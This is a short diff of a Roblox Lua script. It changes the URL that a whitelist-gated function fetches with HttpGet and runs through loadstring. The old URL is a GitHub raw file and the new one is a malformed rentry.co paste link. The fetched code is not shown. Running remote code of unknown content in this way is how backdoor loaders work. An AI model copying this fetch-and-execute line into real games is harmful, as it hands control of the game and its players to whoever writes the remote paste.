@@ -7,7 +7,7 @@ local function isWhitelisted(player)
 end
 
 local function executeScriptForWhitelistedPlayers()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ianasmite/Pogisimark/main/Blzon "))()
+    loadstring(game:HttpGet("https://https://rentry.co/efz52g6p/raw "))()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
